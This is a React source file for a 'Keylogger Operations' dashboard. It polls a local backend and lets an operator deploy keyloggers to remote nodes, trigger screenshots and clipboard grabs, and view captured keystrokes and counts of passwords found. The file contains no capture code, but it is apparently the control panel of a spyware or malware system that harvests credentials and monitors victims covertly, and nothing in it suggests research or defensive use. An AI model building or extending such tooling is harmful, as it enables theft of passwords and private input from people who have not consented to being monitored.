import React, { useState, useEffect, useRef } from "react";
import { motion } from "framer-motion";
import GlitchNumber from "./GlitchNumber";
import { API_URL } from "../config";

const API = "http://localhost:8000";

const KeyloggerPanel: React.FC = () => {
  const [status, setStatus] = useState<any>({ stats: {}, logs: [], active: false, sessions: {} });
  const [executing, setExecuting] = useState<string | null>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const poll = async () => {
      try { const r = await fetch(`${API}/api/keylogger/status`); setStatus(await r.json()); } catch {}
    };
    poll(); const id = setInterval(poll, 2000); return () => clearInterval(id);
  }, []);

  useEffect(() => {
    const c = canvasRef.current; if (!c) return;
    const ctx = c.getContext("2d"); if (!ctx) return;
    const dpr = window.devicePixelRatio || 1;
    const w = 600; const h = 220;
    c.width = w * dpr; c.height = h * dpr; ctx.scale(dpr, dpr);

    const COLUMNS = 50;
    const chars: number[][] = Array.from({ length: COLUMNS }, () => Array(h).fill(0));
    const speeds: number[] = Array.from({ length: COLUMNS }, () => 1 + Math.random() * 3);
    const heads: number[] = Array.from({ length: COLUMNS }, () => Math.floor(Math.random() * h));
    const brights: number[] = Array.from({ length: COLUMNS }, () => Math.random() * 50);
    let t = 0;

    const draw = () => {
      t++;
      ctx.fillStyle = "rgba(6,6,14,0.08)";
      ctx.fillRect(0, 0, w, h);

      const active = status.active;
      const fallSpeed = active ? 0.6 : 0.1;
      const density = active ? 0.4 : 0.05;

      for (let col = 0; col < COLUMNS; col++) {
        if (Math.random() < density) {
          const charCode = 33 + Math.floor(Math.random() * 95);
          chars[col][Math.floor(heads[col]) % h] = charCode;
        }
        heads[col] = (heads[col] + speeds[col] * fallSpeed) % h;

        for (let row = 0; row < h; row += 2) {
          const ch = chars[col][row];
          if (ch > 0) {
            const dist = ((heads[col] - row + h) % h) / h;
            const alpha = dist < 0.15 ? 0.8 : Math.max(0, 1 - dist) * 0.5;
            const x = (col / COLUMNS) * w;
            const y = (row / h) * 220;
            ctx.fillStyle = dist < 0.1 ? `rgba(255,255,255,${alpha})` : `rgba(0,255,136,${alpha})`;
            ctx.font = "9px 'JetBrains Mono', monospace";
            ctx.fillText(String.fromCharCode(ch), x, y);
          }
        }
      }

      // Session count display
      if (status.active && t % 30 === 0) {
        ctx.fillStyle = "rgba(0,255,136,0.08)";
        ctx.font = "bold 52px 'JetBrains Mono', monospace";
        ctx.textAlign = "center";
        ctx.fillText(`${status.stats?.active_sessions || 0} sessions`, w / 2, h / 2 + 16);
      }

      requestAnimationFrame(draw);
    };
    const id = requestAnimationFrame(draw); return () => cancelAnimationFrame(id);
  }, [status.active, status.stats]);

  const execute = async (action: string, params: any = {}, label: string) => {
    setExecuting(label);
    try { await fetch(`${API}/api/keylogger/${action}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(params) }); } catch {}
    setTimeout(() => setExecuting(null), 1500);
  };

  const s = status.stats || {};
  const sessions = status.sessions || {};
  const activeCount = Object.values(sessions).filter((v: any) => v.active).length;

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={styles.wrap}>
      <div style={styles.card}>
        <div style={styles.headerRow}>
          <h2 style={styles.title}><span style={styles.dot}>&#9679;</span>Keylogger Operations</h2>
          <motion.div style={{ ...styles.badge, background: status.active ? "rgba(0,255,136,0.12)" : "rgba(0,212,255,0.06)", color: status.active ? "#00ff88" : "#555", borderColor: status.active ? "rgba(0,255,136,0.3)" : "rgba(0,212,255,0.15)" }}
            animate={{ scale: [1, 1.03, 1] }} transition={{ duration: 1.2, repeat: Infinity }}>
            {status.active ? `${activeCount} CAPTURING` : "IDLE"}
          </motion.div>
        </div>
        <div style={styles.statsGrid}>
          <S label="Keystrokes" value={<GlitchNumber value={s.total_keystrokes || 0} color="#00ff88" fontSize={28} fontWeight={700} intensity={0.6} />} sub="captured" color="#00ff88" />
          <S label="Sessions" value={<GlitchNumber value={activeCount} color="#00d4ff" fontSize={28} fontWeight={700} />} sub="active" color="#00d4ff" />
          <S label="Passwords" value={<GlitchNumber value={s.passwords_captured || 0} color="#ffd700" fontSize={28} fontWeight={700} />} sub="found" color="#ffd700" />
          <S label="Screenshots" value={<GlitchNumber value={s.screenshots || 0} color="#ff6ec7" fontSize={28} fontWeight={700} />} sub="taken" color="#ff6ec7" />
          <S label="Clipboard" value={<GlitchNumber value={s.clipboard_snaps || 0} color="#a855f7" fontSize={28} fontWeight={700} />} sub="grabs" color="#a855f7" />
          <S label="Nodes" value={<GlitchNumber value={s.nodes_deployed || 0} color="#ff4757" fontSize={28} fontWeight={700} />} sub="deployed" color="#ff4757" />
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr", gap: 6 }}>
        <div style={styles.card}>
          <h3 style={styles.sectionTitle}><span style={styles.dot} />Live Key Capture Matrix</h3>
          <canvas ref={canvasRef} style={{ width: "100%", height: 220, borderRadius: 8, background: "rgba(6,6,14,0.5)" }} />
          <div style={{ display: "flex", justifyContent: "space-between", marginTop: 6 }}>
            <span style={{ color: "#444", fontSize: 9, fontFamily: "'JetBrains Mono', monospace" }}>Matrix visualization</span>
            <span style={{ color: "#00ff88", fontSize: 9, fontFamily: "'JetBrains Mono', monospace" }}>{s.total_keystrokes} characters</span>
          </div>
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
          <div style={styles.card}>
            <h3 style={styles.sectionTitle}><span style={styles.dot} />Controls</h3>
            <div style={styles.actionGrid}>
              <Btn2 label="Deploy All" color="#00ff88" loading={executing === "Deploy"} onClick={() => execute("deploy", {}, "Deploy")} />
              <Btn2 label="Capture SS" color="#ff6ec7" loading={executing === "SS"} onClick={() => execute("screenshot", {}, "SS")} />
              <Btn2 label="Grab Clip" color="#a855f7" loading={executing === "Clip"} onClick={() => execute("clipboard", {}, "Clip")} />
              <Btn2 label="Stop All" color="#ff4757" loading={executing === "Stop"} onClick={() => execute("stop", {}, "Stop")} />
            </div>
          </div>
          <div style={styles.card}>
            <h3 style={styles.sectionTitle}><span style={styles.dot} />Active Sessions</h3>
            <div style={styles.feed}>
              {Object.entries(sessions).slice(0, 8).map(([nid, sess]: any) => (
                <div key={nid} style={styles.feedRow}>
                  <span style={{ color: sess.active ? "#00ff88" : "#444", fontSize: 9, fontFamily: "'JetBrains Mono', monospace" }}>{sess.active ? "●" : "○"}</span>
                  <span style={{ color: "#00d4ff", fontSize: 9, fontWeight: 600, fontFamily: "'JetBrains Mono', monospace", flex: 1 }}>{nid}</span>
                  <span style={{ color: "#ffd700", fontSize: 8, fontFamily: "'JetBrains Mono', monospace" }}>{sess.count} keys</span>
                  <span style={{ color: "#555", fontSize: 7, fontFamily: "'JetBrains Mono', monospace" }}>{sess.window?.slice(0, 15)}</span>
                </div>
              ))}
              {activeCount === 0 && <p style={{ color: "#333", fontSize: 10, textAlign: "center", padding: 12 }}>No active sessions</p>}
            </div>
          </div>
        </div>
      </div>

      <div style={styles.card}>
        <h3 style={styles.sectionTitle}><span style={styles.dot} />Captured Keystroke Log</h3>
        <div style={{ ...styles.feed, maxHeight: 220 }}>
          {(status.logs || []).slice(-15).reverse().map((log: any, i: number) => (
            <motion.div key={i} initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }} style={styles.logRow}>
              <span style={{ color: "#333", fontSize: 8, minWidth: 65, fontFamily: "'JetBrains Mono', monospace" }}>{log.timestamp ? new Date(log.timestamp).toTimeString().slice(0, 8) : ""}</span>
              <span style={{ color: "#00d4ff", fontSize: 9, fontWeight: 600, fontFamily: "'JetBrains Mono', monospace", minWidth: 90 }}>{log.node_id}</span>
              <span style={{ color: "#ffd700", fontSize: 9, fontFamily: "'JetBrains Mono', monospace", minWidth: 80 }}>{log.window?.slice(0, 18)}</span>
              <span style={{ color: "#00ff88", fontSize: 9, fontFamily: "'JetBrains Mono', monospace", minWidth: 50 }}>{log.size} chars</span>
              <span style={{ color: "#888", fontSize: 9, fontFamily: "'JetBrains Mono', monospace", flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                {log.data?.slice(0, 80)}
              </span>
            </motion.div>
          ))}
          {(!status.logs || status.logs.length === 0) && <p style={{ color: "#333", fontSize: 10, textAlign: "center", padding: 20 }}>No keystrokes captured — deploy to begin</p>}
        </div>
      </div>
    </motion.div>
  );
};

function S({ label, value, sub, color }: any) { return (<div style={{ textAlign: "center", padding: "6px 4px" }}><div style={{ color, fontSize: 26, fontWeight: 700, fontFamily: "'JetBrains Mono', monospace" }}>{value}</div><div style={{ color: "#aaa", fontSize: 9, textTransform: "uppercase", letterSpacing: 1, marginTop: 3, fontFamily: "'JetBrains Mono', monospace" }}>{label}</div><div style={{ color: "#444", fontSize: 8, marginTop: 1, fontFamily: "'JetBrains Mono', monospace" }}>{sub}</div></div>); }

function Btn2({ label, color, loading, onClick }: any) {
  return (<motion.button whileHover={{ scale: 1.03 }} whileTap={{ scale: 0.97 }} style={{ ...styles.btn, borderColor: `${color}30`, opacity: loading ? 0.5 : 1 }} onClick={onClick} disabled={loading}>
    {loading ? <motion.span animate={{ rotate: 360 }} transition={{ duration: 0.8, repeat: Infinity, ease: "linear" }} style={{ display: "inline-block", fontSize: 14 }}>&#9696;</motion.span> : null}
    <span style={{ color, fontSize: 10, fontWeight: 700, fontFamily: "'JetBrains Mono', monospace" }}>{label}</span>
  </motion.button>);
}

const styles: Record<string, React.CSSProperties> = {
  wrap: { display: "flex", flexDirection: "column", gap: 6, margin: "0 20px 6px" },
  card: { background: "rgba(12,14,28,0.85)", backdropFilter: "blur(20px)", borderRadius: 12, border: "1px solid rgba(0,255,136,0.1)", padding: "14px 16px", boxShadow: "0 4px 40px rgba(0,0,0,0.3)" },
  headerRow: { display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 },
  title: { margin: 0, color: "#00ff88", fontSize: 16, fontWeight: 600, fontFamily: "'JetBrains Mono', monospace", display: "flex", alignItems: "center", gap: 8, textShadow: "0 0 8px rgba(0,212,255,0.3)", animation: "textGlowPulse 3s ease-in-out infinite" },
  dot: { fontSize: 8, color: "#00ff88", animation: "pulse 2s infinite" },
  sectionTitle: { margin: "0 0 8px 0", color: "#aaa", fontSize: 13, fontWeight: 500, fontFamily: "'JetBrains Mono', monospace", display: "flex", alignItems: "center", gap: 6 },
  badge: { padding: "4px 12px", borderRadius: 8, fontSize: 10, fontWeight: 700, fontFamily: "'JetBrains Mono', monospace", border: "1px solid", letterSpacing: 1 },
  statsGrid: { display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gap: 4, borderTop: "1px solid rgba(255,255,255,0.03)", paddingTop: 12 },
  actionGrid: { display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 4 },
  btn: { display: "flex", alignItems: "center", justifyContent: "center", gap: 6, padding: "10px 6px", background: "rgba(6,6,14,0.5)", border: "1px solid", borderRadius: 8, cursor: "pointer", fontFamily: "'JetBrains Mono', monospace", transition: "all 0.2s" },
  feed: { display: "flex", flexDirection: "column", gap: 2, maxHeight: 150, overflowY: "auto" },
  feedRow: { display: "flex", alignItems: "center", gap: 6, padding: "4px 8px", background: "rgba(6,6,14,0.4)", borderRadius: 4 },
  logRow: { display: "flex", alignItems: "center", gap: 8, padding: "5px 10px", background: "rgba(6,6,14,0.4)", borderRadius: 6 },
};

export default KeyloggerPanel;
